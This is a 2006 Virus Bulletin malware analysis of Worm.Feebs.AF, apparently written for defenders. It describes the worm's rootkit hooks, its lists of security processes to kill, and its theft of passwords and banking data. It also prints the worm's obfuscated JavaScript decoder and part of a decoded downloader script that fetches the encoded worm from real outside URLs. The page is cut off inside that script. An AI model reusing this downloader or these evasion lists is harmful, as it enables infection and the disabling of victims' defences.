<!DOCTYPE html>
<html lang="en" class="no-js">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<script type="text/javascript">var BOOTSTRAP_VERSION ="lumen";
	var BOOTSTRAP_JS_HEAD =1;
	var BOOTSTRAP_CDN_ENABLE =0; var BOOTSTRAP_NAVBAR_TYPE =0; var BOOTSTRAP_LOGO_OPTION =0; var BOOTSTRAP_NAVBAR =1; var BootstrapInputFix =true;var BootstrapNavbarLineHeightFix =true;var BOOTSTRAP_EDT= 0; </script>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<title>Virus Bulletin :: Not a feeble attempt</title>
<meta name="description" content="Viktor Johasz details Worm.Feebs.AF." />
<meta name="generator" content="concrete5 - 5.6.3.5" />
<script type="text/javascript">
var CCM_DISPATCHER_FILENAME = '/index.php';var CCM_CID = 2649;var CCM_EDIT_MODE = false;var CCM_ARRANGE_MODE = false;var CCM_IMAGE_PATH = "/concrete/images";
var CCM_TOOLS_PATH = "/index.php/tools/required";
var CCM_BASE_URL = "https://www.virusbulletin.com";
var CCM_REL = "";

</script>
<link rel="shortcut icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="stylesheet" type="text/css" href="/concrete/css/ccm.base.css" />
<script type="text/javascript" src="/concrete/js/jquery.js"></script>
<script type="text/javascript" src="/concrete/js/ccm.base.js"></script>
<script type="text/javascript">
var COOKIES_ALLOWED=false;
</script>
<link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure.css" />
<!--[if lte IE 8]><link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure_ie.css" /><![endif]-->
<script type="text/javascript">
var COOKIES_DISCLOSURE_HIDE_INTERVAL=10;
</script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_hide.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap-overwrites.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/members.css" />
<script type="text/javascript" src="/packages/bootstrap/js/common/prettify.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/jquery.easing.1.3.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/bootstrap.min.js"></script>
<link rel="stylesheet" type="text/css" href="/libraries/css/jquery.fancybox.css" />
<script type="text/javascript" src="/libraries/js/jquery.fancybox.pack.js"></script>
<link rel="stylesheet" media="screen" type="text/css" href="/files/cache/css/bootstrap/typography.css" />
<script type="text/javascript" src="/index.php/tools/packages/free_cookies_disclosure/disclosure_i18n_js"></script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_ajax_form.js"></script>
<link rel="stylesheet" type="text/css" href="/concrete/blocks/page_list/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/remo_expand/blocks/remo_expand/templates/vbexpand/view.css" />
<script type="text/javascript" src="/packages/remo_expand/js/jquery.color.js"></script>
<script type="text/javascript" src="/packages/remo_expand/js/jquery.ba-hashchange.js"></script>
<script type="text/javascript" src="/packages/remo_expand/js/remo.expand.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/blocks/search/templates/VB_global_search/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/travisn_spacer/css/ccm.tnspacer.css" />

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1" crossorigin="anonymous">

<script src="https://cdnjs.cloudflare.com/ajax/libs/prettify/r298/run_prettify.js" integrity="sha256-1SFdTXlsw0RkQ+iO0E91LDshGiIbPiTYqJto0px4wds=" crossorigin="anonymous"></script>
<!--[if gte IE 9]>
<script src="/packages/bootstrap/js/common/modernizr.js"></script>
<![endif]-->

<!--[if lt IE 9]>	
	
	<script src="/packages/bootstrap/js/common/html5shiv.js"></script>
	<script src="/packages/bootstrap/js/common/respond.min.js"></script>
	
<![endif]-->
</head>
<body data-spy="scroll" data-target=".bs-sidebar">

<div class="navbar  navbar-fixed-top navbar-default  bs-docs-nav">
<div class="navbar-inner">
<div class="container"><div class="row"><div class="col-sm-4 col-md-4 logo-position-1 col-logo">
<div class="navbar-header">
<button type="button" class="navbar-toggle btn_navbar_custom">
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button><div class="mobile-clearfix"></div><div class="navbar-brand navbar-brand-area"><a href="/"><img border="0" class="ccm-image-block" alt="" src="/files/4614/4535/7515/logo-big.png" width="339" height="92" /></a></div> </div>
</div><div class="col-sm-8 col-md-8 logo-position-1 col-nav"> <div class="nav-collapse collapse nav_collapse_custom navbar-collapse"> <div style="clear:both"></div>
<div class="vb-global-search-div">
<form action="/index.php/global-search-results/" method="get">
<fieldset>
<input name="search_paths[]" type="hidden" value="" />
<input name="query" type="text" class="vb-global-search" placeholder="Search site..." />
<input name="submit" type="submit" value="Search!" style="display:none" />
</fieldset>
</form>
</div>
<div class="tnSpacer" style="height:48px"></div>
<ul class="nav nav-pills"><li class=" nav-first nav-item-6299"><a href="/newsletter/" target="_self" class=" nav-first nav-item-6299 ">Newsletter</a></li><li class=" nav-item-260"><a href="/conference/" target="_self" class=" nav-item-260 ">VB Conference</a></li><li class=" nav-item-166"><a href="/testing/" target="_self" class=" nav-item-166 ">VB Testing</a></li><li class=" nav-path-selected active nav-item-160"><a href="/virusbulletin/" target="_self" class=" nav-path-selected active nav-item-160 ">Bulletin</a></li><li class=" nav-last nav-item-130"><a href="/blog/" target="_self" class=" nav-last nav-item-130 ">Blog</a></li></ul> </div>
</div>
</div><div class="clearfix"></div>
</div>
</div>
</div>
<div class="navbar-top-fixed-space "><div class="clearfix"></div></div>

<div class="container m-top-20">
<div class="row">
<div class="col-md-9 col-sm-9 col-lg-9">
<div class="titlepage" xmlns=""><div><div><h1 class="title" xmlns="http://www.w3.org/1999/xhtml"><a id="vb200604-feebs"></a>Not a feeble attempt</h1></div><div><p class="pubdate" xmlns="http://www.w3.org/1999/xhtml">2006-04-01</p></div><div><div class="authorgroup" xmlns="http://www.w3.org/1999/xhtml"><div class="author titlepage"><h3 class="author"><span class="firstname">Viktor</span> <span class="surname">Juhasz</span></h3><span class="orgname">Virus Buster</span>, <span class="orgdiv">Hungary</span></div><b class="editedby">Editor: </b><span class="editor"><span class="firstname">Helen</span> <span class="surname">Martin</span></span></div></div><div><div class="abstract" xmlns="http://www.w3.org/1999/xhtml"><p class="title"><b>Abstract</b></p><p>Viktor Johasz details Worm.Feebs.AF.</p></div></div><div><p class="copyright" xmlns="http://www.w3.org/1999/xhtml"><i>Copyright &copy; 2006 Virus Bulletin</i></p></div></div><hr /></div>
<div class="ccm-remo-expand">
<div id="ccm-remo-expand-title-4885" class="ccm-remo-expand-title ccm-remo-expand-closed" data-expander-speed="200">Table of contents</div><div id="ccm-remo-expand-content-4885" class="ccm-remo-expand-content"><div class="toc"><dl><dt><span class="sect1"><a href="#id3392801">Introduction</a></span></dt><dt><span class="sect1"><a href="#id2296377">System infection and preparations</a></span></dt><dt><span class="sect1"><a href="#id4884153">Infect any which way you can</a></span></dt><dt><span class="sect1"><a href="#id3854495">Scripting is back to the game</a></span></dt><dt><span class="sect1"><a href="#id2974729">Conclusion</a></span></dt></dl></div></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3392801"></a>Introduction</h2></div></div></div><p>For recent variants of Worm.Feebs, analysis, detection and removal have been equally difficult tasks. The worm stores its string variables in encoded form and decodes them in runtime into stack variables using a unique algorithm. The worm is hard to detect because it hides itself using its rootkit functions (although not in safe mode). It is difficult to remove the worm in <em class="productname">Windows</em> normal mode, as the worm injects itself into many processes, including the system processes explorer.exe and scvhost.exe. To complicate matters further, Feebs has many infection vectors, including email, ftp, P2P and AIM (AOL Instant Messenger).</p><p>There are many variants of this worm, with new versions surfacing almost every day. This analysis details Worm.Feebs.AF (released 30 January), but the main functions of the worm are very similar throughout all variants.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id2296377"></a>System infection and preparations</h2></div></div></div><p>When the worm is executed it drops a dll file as &#39;c:\b&#39;, if b already exists then it moves on to name &#39;c:\c&#39;, &#39;c:\d&#39;, etc., until it finds a non-existent filename or reaches c:\z. If it has reached c:\z it tries to load c:\z. This dropped file is the main part of the worm.</p><p>When this module is dropped successfully the dropper loads it and checks if a debugger is present by calling the IsDebuggerPresent API function and attempting to open streams \\.\NTICE and \\.\SICE. If any debuggers are detected the worm exits, calling ExitProcess.</p><p>The worm creates a two-character string from the Windows version and serial number of &#39;C:\&#39;, which it appends to the &#39;Software\Microsoft\MS&#39; string. The resulting string will be the main registry key of the worm &ndash; for example, &#39;Software\Microsoft\MSIJ&#39;. It creates the following values under this key:</p><table border="0" class="simplelist" summary="Simple list"><tr><td>exe=&ldquo;ms[2rnd char].exe&rdquo; (the dropper name)</td></tr><tr><td>dll=&ldquo;ms[2rnd char]32.dll&rdquo; (name of dll)</td></tr><tr><td>buf=&ldquo;ms[2rnd char].db&rdquo; (stealth data file)</td></tr><tr><td>clo=&ldquo;ms[2rnd char]&rdquo; (copy of the worm)</td></tr><tr><td>dir=&ldquo;drivers\ms[2rnd char]\&rdquo; (storing directory)</td></tr></table><p>After these, it queries the name of the program module. If this is the name of a security program (i.e. firewall or anti-virus software), it terminates the process. The searched strings are the following:</p><table border="0" class="simplelist" summary="Simple list"><tr><td>avp6</td></tr><tr><td>keylog</td></tr><tr><td>avz</td></tr><tr><td>rootkitrevealer</td></tr><tr><td>nod32krn</td></tr><tr><td>kpf4ss</td></tr><tr><td>rapapp</td></tr><tr><td>hackereliminator</td></tr><tr><td>outpost</td></tr><tr><td>firesvc</td></tr><tr><td>firewal</td></tr><tr><td>mcafeefire</td></tr><tr><td>hacker</td></tr><tr><td>vipnet</td></tr><tr><td>ca</td></tr><tr><td>internet security</td></tr><tr><td>zapro</td></tr><tr><td>zonealarm</td></tr><tr><td>vsmon</td></tr><tr><td>zlclient</td></tr><tr><td>pavfnsvr</td></tr><tr><td>avgcc</td></tr><tr><td>fsdfwd</td></tr><tr><td>dfw</td></tr><tr><td>fireballdta</td></tr><tr><td>fbtray</td></tr><tr><td>goldtach</td></tr><tr><td>ipcserver</td></tr><tr><td>avs</td></tr><tr><td>jammer</td></tr><tr><td>armorwall</td></tr><tr><td>armor2net</td></tr><tr><td>iamapp</td></tr><tr><td>iamserv</td></tr><tr><td>blackd</td></tr><tr><td>dpf</td></tr><tr><td>xfilter</td></tr><tr><td>looknstop</td></tr><tr><td>mpftray</td></tr><tr><td>leviathantrial</td></tr><tr><td>netlimiter</td></tr><tr><td>npgui</td></tr><tr><td>npfsvice</td></tr><tr><td>npfmsg</td></tr><tr><td>npfc</td></tr><tr><td>opfsvc</td></tr><tr><td>opf</td></tr><tr><td>ipatrol</td></tr><tr><td>spfw</td></tr><tr><td>sppfw</td></tr><tr><td>kavpf</td></tr><tr><td>spfirewallsvc</td></tr><tr><td>sspfwtry2</td></tr><tr><td>keypatrol</td></tr><tr><td>s-wall</td></tr><tr><td>smc</td></tr><tr><td>umxtray</td></tr><tr><td>persfw</td></tr><tr><td>pccpfw</td></tr><tr><td>tzpfw</td></tr><tr><td>xeon</td></tr><tr><td>fw</td></tr><tr><td>bgnewsui</td></tr><tr><td>bullguard</td></tr><tr><td>fwsrv</td></tr></table><p>Another string is created using the <em class="productname">Windows</em> version and serial number of &#39;C:\&#39;, and by checking whether there is already a window with this class name, the worm determines whether another instance is running already. If it does not detect itself, it hooks the following <em class="productname">Windows</em> API functions:</p><table border="0" class="simplelist" summary="Simple list"><tr><td>send</td></tr><tr><td>gethostbyname</td></tr><tr><td>InternetConnectA</td></tr><tr><td>InternetConnectW</td></tr><tr><td>HttpOpenRequestW</td></tr><tr><td>HttpOpenRequestA</td></tr><tr><td>HttpSendRequestW</td></tr><tr><td>HttpSendRequestA</td></tr><tr><td>InternetReadFile</td></tr><tr><td>InternetQueryDataAvailable</td></tr><tr><td>FindFirstFileW</td></tr><tr><td>FindFirstFileA</td></tr><tr><td>FindNextFileW</td></tr><tr><td>FindNextFileA</td></tr><tr><td>RegEnumKeyA</td></tr><tr><td>RegEnumKeyW</td></tr><tr><td>RegEnumKeyExA</td></tr><tr><td>RegEnumKeyExW</td></tr><tr><td>RegEnumValueA</td></tr><tr><td>RegEnumValueW</td></tr><tr><td>ZwQuerySystemInformation</td></tr><tr><td>OpenProcess</td></tr></table><p>Next, the module is loaded (DllMain returns true) and the dropper calls the U exported function of the dropped file. The U function injects the module into the system.</p><p>If the process name contains the string &#39;install&#39;, a message box is displayed with this text (in the case of a network share infection the infected file name will be &#39;webinstall.exe&#39;):</p><pre class="programlisting">Could not initialize installation</pre><p>The value &#39;web=http://ucrack.t35.com/&#39; is added to the &#39;HKCU\Software\Microsoft\Internet Explorer&#39; registry key. Then the worm deletes the registry value created by the downloader or dropper script component (if it was executed from that source):</p><p>&#39;SOFTWARE\Microsoft\Active Setup\Installed Components\{CD5AC91B-AE7B-E83A-0C4C-E616075972F3}&#39;</p><p>The &#39;Safe for Scripting&#39; category for the FileSystemObject and WSCRIPT.SHELL controls is deleted (the &#39;{7DD95801-9882-11CF-9FA9-00AA006C42C4}&#39; subkey under keys &#39;HKCR\CLSID\{72C24DD5-D70A-438B-8A42-98424B88AFB8}\Implemented Categories&#39; and &#39;HKCR\CLSID\{0D43FE01-F093-11CF-8940-00A0C9054228}\Implemented Categories&#39;). This is done so that the download scripts of the future variants can execute without warning or error messages.</p><p>The worm copies itself as the dll value of the main registry key (i.e. ms[2rnd char]32.dll) into the %SYSTEM% directory. It creates a random SID, registers itself in the HKCU\CLSID registry key, and adds this SID into HKLM\Software\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad so that the dll will be loaded by explorer.exe when it starts.</p><p>It then copies the main file of the process to the exe value of the main registry key (ms[2rnd char].exe). Then it starts a thread to find &#39;FailureActions&#39; in the registry key of every service and deletes these values to avoid any error messages in the services.</p><p>The worm stops and deletes the following services:</p><table border="0" class="simplelist" summary="Simple list"><tr><td>vsadant</td></tr><tr><td>scramble</td></tr><tr><td>outpostfirewall</td></tr><tr><td>rapapp</td></tr><tr><td>kpf4</td></tr><tr><td>firesvc</td></tr><tr><td>rapdrv</td></tr><tr><td>fireprox</td></tr><tr><td>firepm</td></tr><tr><td>firetdi</td></tr><tr><td>firehook</td></tr><tr><td>fwdrv</td></tr><tr><td>khips</td></tr><tr><td>kmxagent</td></tr><tr><td>kmxbig</td></tr><tr><td>kmxcfg</td></tr><tr><td>kmxfile</td></tr><tr><td>kmxfw</td></tr><tr><td>kmxids</td></tr><tr><td>kmxnids</td></tr><tr><td>kmxsbx</td></tr><tr><td>black</td></tr><tr><td>rap</td></tr><tr><td>makont</td></tr></table><p>In addition, the worm deletes the autorun keys of a number of security programs from the registry keys:</p><table border="0" class="simplelist" summary="Simple list"><tr><td>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</td></tr><tr><td>HKLM\Software\Microsoft\Windows\CurrentVersion\Runservices</td></tr><tr><td>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</td></tr></table><p>The values may be the following:</p><table border="0" class="simplelist" summary="Simple list"><tr><td>avz</td></tr><tr><td>rootkitrevealer</td></tr><tr><td>nod32krn</td></tr><tr><td>kpf4ss</td></tr><tr><td>kpf4gui</td></tr><tr><td>rapapp</td></tr><tr><td>hackereliminator</td></tr><tr><td>outpost</td></tr><tr><td>firesvc</td></tr><tr><td>mcafeefire</td></tr><tr><td>avp6</td></tr><tr><td>keylog</td></tr></table><p>Then the worm executes the %System%\ms[2rnd].exe file and deletes itself (file b).</p><p>If the module is loaded by the %System%\ms[2rnd].exe process it creates an email address and stores it in the \dat registry key. This generated email address will be one of the possible sender addresses. The format of the address is:</p><table border="0" class="simplelist" summary="Simple list"><tr><td>[String1][random number between 2000-2005]@[string2]</td></tr></table><p>The possible values of String1 are:</p><table border="0" class="simplelist" summary="Simple list"><tr><td>Alice</td></tr><tr><td>Alley</td></tr><tr><td>Angel</td></tr><tr><td>Anna</td></tr><tr><td>Baby</td></tr><tr><td>Brenda</td></tr><tr><td>Cindy</td></tr><tr><td>Claudia</td></tr><tr><td>Debby</td></tr><tr><td>Helen</td></tr><tr><td>Honey</td></tr><tr><td>Jane</td></tr><tr><td>Jose</td></tr><tr><td>Julie</td></tr><tr><td>Linda</td></tr><tr><td>Maria</td></tr><tr><td>Mary</td></tr><tr><td>Melissa</td></tr><tr><td>Mia</td></tr><tr><td>Milla</td></tr><tr><td>Nikky</td></tr><tr><td>Pamela</td></tr><tr><td>Pussy</td></tr><tr><td>Sexy</td></tr><tr><td>Sunny</td></tr><tr><td>Sweety</td></tr><tr><td>Tanya</td></tr><tr><td>Trinity</td></tr><tr><td>Adam</td></tr><tr><td>Alex</td></tr><tr><td>Andrew</td></tr><tr><td>Bill</td></tr><tr><td>Bob</td></tr><tr><td>Brent</td></tr><tr><td>Brian</td></tr><tr><td>Dan</td></tr><tr><td>Dave</td></tr><tr><td>David</td></tr><tr><td>Fred</td></tr><tr><td>George</td></tr><tr><td>Jack</td></tr><tr><td>James</td></tr><tr><td>Jerry</td></tr><tr><td>Jim</td></tr><tr><td>Jimmy</td></tr><tr><td>Joe</td></tr><tr><td>John</td></tr><tr><td>Kevin</td></tr><tr><td>Leo</td></tr><tr><td>Matt</td></tr><tr><td>Michael</td></tr><tr><td>Mike</td></tr><tr><td>Neo</td></tr><tr><td>Peter</td></tr><tr><td>Ray</td></tr><tr><td>Robert</td></tr><tr><td>Sam</td></tr><tr><td>Serg</td></tr><tr><td>Smith</td></tr><tr><td>Stan</td></tr><tr><td>Steve</td></tr><tr><td>Ted</td></tr><tr><td>Tom</td></tr></table><p>Possible values of String2 are: Yahoo.com, HotMail.com, MSN.com and Gmail.com.</p><p>An example address would be: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="46152b2f322e7476767506012b272f2a6825292b68">[email&#160;protected]</a></p><p>Next, it injects itself into the explorer.exe process. From the explorer.exe process it starts svchost.exe and injects itself into this process too. It saves the pid of the svchost.exe process. If any program attempts to open the process using this pid, the worm will terminate the caller process.</p><p>From this process it creates a window and saves the handle of the window to the mti registry value.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4884153"></a>Infect any which way you can</h2></div></div></div><p>Eight threads are started for the worm&rsquo;s main functionality.</p><p>Thread 1 creates zip files in all directories where the full pathname has one of the following strings: data\playlists, download, upload, incom or share, unless the path contains the &#39;common&#39; substring.</p><p>The following are the possible filenames:</p><table border="0" class="simplelist" summary="Simple list"><tr><td>Adobe_Premiere_9_(2.0_pro)_new!_full+crack.zip</td></tr><tr><td>3dsmax_9_(3D_Studio_Max)_new!_full+crack.zip</td></tr><tr><td>Adobe_Photoshop_10_(CS3)_new!_full+crack.zip</td></tr><tr><td>Microsoft_Office_2006_new!_full+crack.zip</td></tr><tr><td>Microsoft_Office_2006_new!_full+crack.zip</td></tr><tr><td>Ahead_Nero_8_new!_full+crack.zip</td></tr><tr><td>winamp_5.2_new!_full+crack.zip</td></tr><tr><td>ACDSee_9_new!_full+crack.zip</td></tr><tr><td>DivX_7.0_new!_full+crack.zip</td></tr><tr><td>ICQ_2006_new!_full+crack.zip</td></tr><tr><td>Longhorn_new!_full+crack.zip</td></tr><tr><td>Kazaa_4_new!_full+crack.zip</td></tr></table><p>The zip archives consist of two files: webinstall.exe (dropper file) and *_serial.txt (the content of this file is the text &#39;11111-11111-11111&#39;), where &#39;*&#39; is the zip filename without the &#39;new!_full+crack.zip&#39; string.</p><p>The worm collects email addresses from files that have the following file extensions on fixed drives:</p><table border="0" class="simplelist" summary="Simple list"><tr><td>wab</td></tr><tr><td>xls</td></tr><tr><td>vap</td></tr><tr><td>stm</td></tr><tr><td>sln</td></tr><tr><td>pst</td></tr><tr><td>ods</td></tr><tr><td>nch</td></tr><tr><td>nab</td></tr><tr><td>mht</td></tr><tr><td>mdx</td></tr><tr><td>mdw</td></tr><tr><td>mde</td></tr><tr><td>mdb</td></tr><tr><td>mda</td></tr><tr><td>ldb</td></tr><tr><td>ini</td></tr><tr><td>htt</td></tr><tr><td>fdb</td></tr><tr><td>csv</td></tr><tr><td>cfg</td></tr><tr><td>adp</td></tr><tr><td>ade</td></tr><tr><td>abc</td></tr><tr><td>wsh</td></tr><tr><td>vcf</td></tr><tr><td>vbs</td></tr><tr><td>uin</td></tr><tr><td>txt</td></tr><tr><td>tbb</td></tr><tr><td>sql</td></tr><tr><td>sht</td></tr><tr><td>rtf</td></tr><tr><td>pnx</td></tr><tr><td>pmr</td></tr><tr><td>pmo</td></tr><tr><td>oft</td></tr><tr><td>myd</td></tr><tr><td>msg</td></tr><tr><td>msf</td></tr><tr><td>mbx</td></tr><tr><td>mbs</td></tr><tr><td>mab</td></tr><tr><td>ldif</td></tr><tr><td>inb</td></tr><tr><td>mm</td></tr><tr><td>imb</td></tr><tr><td>ibx</td></tr><tr><td>fpt</td></tr><tr><td>eml</td></tr><tr><td>doc</td></tr><tr><td>db</td></tr><tr><td>adr</td></tr><tr><td>addr</td></tr><tr><td>adb</td></tr><tr><td>abk</td></tr><tr><td>abd</td></tr><tr><td>slk</td></tr><tr><td>pp</td></tr><tr><td>nws</td></tr><tr><td>nsf</td></tr><tr><td>nfo</td></tr><tr><td>mmf</td></tr><tr><td>log</td></tr><tr><td>imh</td></tr><tr><td>hlp</td></tr><tr><td>frm</td></tr><tr><td>ctl</td></tr><tr><td>cms</td></tr><tr><td>cls</td></tr><tr><td>bas</td></tr><tr><td>bak</td></tr><tr><td>abx</td></tr><tr><td>htm</td></tr><tr><td>xml</td></tr><tr><td>pl</td></tr><tr><td>dhtm</td></tr><tr><td>shtm</td></tr><tr><td>phtm</td></tr><tr><td>htm</td></tr><tr><td>cgi</td></tr><tr><td>jsp</td></tr><tr><td>php</td></tr><tr><td>asp</td></tr></table><p>The worm saves the collected email addresses to the dat registry subkeys without any limitations.</p><p>It collects directory names that belong to security software (detecting them by matching the name), and which also have the &#39;upd&#39; string (e.g. c:\avp6\update\), and stores them in the ldat subkey. (It enumerates all directories on the hard drive and performs two string matches on them.) So if a directory path includes any string of security software and the upd string, it adds the directory path to the ldat key as a binary value.</p><p>Thread 2 hooks GetMessage (WH_GETMESSAGE) to steal passwords. It uses stolen ftp (via hooked &#39;send&#39;) accesses to infect servers. It renames default files (such as index.html, default.php etc.) to &#39;_[filename]&#39; and uploads scripts named a.php, a.pl and a.asp. The content of these scripts is the same as that used at email infection.</p><p>Thread 3 monitors the Fethard and WebMoney services to steal accesses. It looks for windows with the text &#39;Fethard key manager&#39; or &#39;WebMoney Keeper&#39; and copies the text of a specified child window.</p><p>Thread 4 deletes all files from directories stored in the ldat key and deletes the security services listed above.</p><p>Thread 5 starts an HTTP server (which processes only GET queries) to infect computers that connect to it. If the server receives a GET HTTP request it sends back the infector script.</p><p>Thread 6 is a backdoor thread. Attackers can upload, download, execute and delete files and use the infected computer as a proxy server.</p><p>Thread 7 is an update thread. It downloads and installs newer versions of the worm and notifies the attacker(s) via <em class="productname">ICQ</em>.</p><p>Thread 8 is the email infection thread. It sends messages with the attached script to the email addresses that have been collected. The sender is spoofed in these messages.</p><p>The worm employs rootkit methods, hooking many API functions. The hooking method has the following characteristics:</p><div class="itemizedlist"><ul type="disc"><li><p>The first five bytes of the original function are stored.</p></li><li><p>The distance between the function and hook method is calculated.</p></li><li><p>The first five bytes will be a jump to hook method.</p></li><li><p>When the hook function calls the original function it restores the five bytes, calls the function and rehooks the API.</p></li></ul></div><p>The intercepted function groups are the following:</p><div class="itemizedlist"><ul type="disc"><li><p>FindFiles API functions (FindFirstFileA, FindFirstFileW, FindNextFileA, FindNextFileW): the worm skips all files that have names of the pattern it uses for its own files. If the call comes from a P2P program (<em class="productname">Kazaa</em>, <em class="productname">Morpheus</em> etc. &ndash; recognized by name), the infected zip files are not skipped from the list to ensure the functionality of the P2P infection.</p></li><li><p>ZwQuerySystemInformation: the worm removes its own process from the process list.</p></li><li><p>OpenProcess: if a process attempts to open the hidden process (identified by the stored pid value) the worm terminates the caller process.</p></li><li><p>Registry view APIs: all values and keys that belong to the worm are hidden.</p></li><li><p>gethostbyname: if the caller process is in the deny list, access to query the IP address of the host name is denied.</p></li></ul></div><p>The hooked APIs are used to steal passwords and user data:</p><div class="itemizedlist"><ul type="disc"><li><p>send: data is prevented from being sent to the security software processes and web browsers other than IE. The function depends on the target port.</p></li><li><p>POP3, FTP: steals passwords and user names. The collected data is stored to the fdat (FTP) and pdat (POP3) subkeys.</p></li><li><p>SMTP, POP3: stores the sender email address to the mdat subkey and attaches the script to the outgoing mail. This is one of the rare examples of a worm that attaches itself to legitimate email messages.</p></li><li><p>AIM port (port 5190): collects user accesses and infection like POP3. Control ports (port 25, 135, 445, 1433, 1434, 6667) can be used by explorer.exe.</p></li><li><p>InternetAPIs (InternetConnectA, InternetConnectW, HttpOpenRequestA, HttpOpenRequestW, HttpSendRequestA, HttpSendRequestW, InternetReadFile, InternetQueryDataAvailable): these are used to steal banking information (card number, pin number etc.) by matching the sent data to a list of monitored strings.</p></li></ul></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3854495"></a>Scripting is back to the game</h2></div></div></div><p>The worm has two types of script: a downloader script and a dropper script.Both types of script have two parts: a short decoder and the longer main part.</p><p>The downloader script downloads one of the following URLs:</p><table border="0" class="simplelist" summary="Simple list"><tr><td>ssddsf.coconia.net/lol.txt</td></tr><tr><td>pogc.wol.bz/lol.txt</td></tr><tr><td>fr33.by.ru/ol.txt</td></tr><tr><td>boblol.zoo.by/ol.txt</td></tr><tr><td>jppo.t35.com/lol.c</td></tr><tr><td>jmo31.by.ru/big.txt</td></tr><tr><td>duuw.nm.ru/ol.txt</td></tr></table><p>These locations may differ depending on the variant. The content of these URLs is the BASE64 encoded form of the worm.</p><p>The dropper script includes a BASE64 encoded exe file.</p><p>The source of the decoder script is the following:</p><pre class="programlisting">var1=&rdquo;function var2(var3){var
var4=decodestring,var5,var6,var7,var8=&#39;&#39;,var9=&#39;&#39;,var10;for(var6=0;var6&lt;var3.length;var6++)
{var10=var3.charAt(var6);var7=var4.indexOf(var10);if(var7&gt;-1){var5=((var7+1)%decodestringlength-1);
if(var5&lt;=0){var5+=
decodestringlength
}var8+=var4.charAt(var5-1)}else{var8+=var10}}var9+=var8;document.write(var9)}&rdquo;</pre><p>Here, var1 is a four-character string, var2&ndash;10 are single characters, and decodestring is a randomly generated string.</p><p>Strings are generated in runtime so every script has different variables. Here is an example of a possible non-encoded script:</p><pre class="programlisting">Ocqz=&rdquo;function w(p){ var
e=&rdquo;o:A\&rdquo;.[z_HC3|<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="45610511177022342f">[email&#160;protected]</a>}2Su{&lsquo;-VZ4&amp;pm];)r^sBJUI!EWt8Xv7~a6Dfb#*0=YFG
yKW&rsquo;c(L+,/MN9deOPQ&rdquo;,h,x,d,c=&rsquo;&rsquo;,l=&rsquo;&rsquo;,a;for(x=0;x&lt;p.length;x++){a=p.charAt(x);d=e.indexOf(a);
if(d&lt;-1){h=((d+1)%84-1);if(h&lt;=0){h+=84]c+=e.charAt(h-1)}else{c+=a}}l+c;document.write(l)}&rdquo;</pre><p>A simple obfuscation is added to the script, which has evolved over time. The evolution of script is as follows:</p><div class="itemizedlist"><ul type="disc"><li><p>The entire decoder script is replaced with escape codes.</p></li><li><p>Characters at random positions are replaced with escaped versions (e.g. &#39;f&#39; replaced with &#39;%66&#39;).</p></li><li><p>Script splits into substrings which are concatenated, e.g. lzv=lzv+okg+mkdb.</p></li><li><p>Unescape sign is replaced with another character (e.g. &#39;%&#39; replaced with &#39;_&#39;).</p></li><li><p>Reverse encoded string.</p></li><li><p>Strings have only one functionality to make detection difficult, e.g. tezpf=&ldquo;7849&rdquo;.</p></li></ul></div><p>The following is an example of the decoded string:</p><pre class="programlisting">Connecting to Yahoo.com secure mail server...&lt;script
language=JavaScript&gt;function u(){document.write(&#39;Unable To Connect to
Server. Please check your Internet connection and try again.&lt;script
language=JavaScript&gt;cj=&quot;\\\\&quot;;dr=&quot;c:&quot;+cj+&quot;Recycled&quot;+cj;b=dr+&quot;userinit.exe&quot;;try{f=new
ActiveXObject(&quot;Scripting.FileSystemObject&quot;);n=new
ActiveXObject(&quot;WScript.Shell&quot;);nx=1;if(f.FileExists(b)){ex=f.GetFile(b);if(ex.size&gt;20000)nx=0;}
function
fl(){return
false}document.oncontextmenu=fl;f.CreateFolder(dr);}catch(t1){};&lt;\/script&gt;&lt;script
language=&quot;vbs&quot;&gt;If nx Then\nset
IE=CreateObject(&quot;InternetExplorer.Application&quot;)\nIE.Visible=0\nSub
Sp\nWhile IE.Busy=true\nWend\nEnd
Sub\nur=Array(&quot;ssddsf.coconia.net\/lol.txt&quot;,&quot;pogc.wol.bz\/lol.txt&quot;,&quot;fr33.by.ru\/ol.txt&quot;,
&quot;boblol.zoo.by\/ol.txt&quot;,
&quot;jppo.t35.com\/lol.c&quot;,&quot;volum.1gb.ru\/ol.txt&quot;,&quot;duuw.nm.ru\/ol.txt&quot;)\nFor
un=0 To 6\nIE.Navigate(ur(un))\nSp\ng=IE.Document.body.innerText\nIf
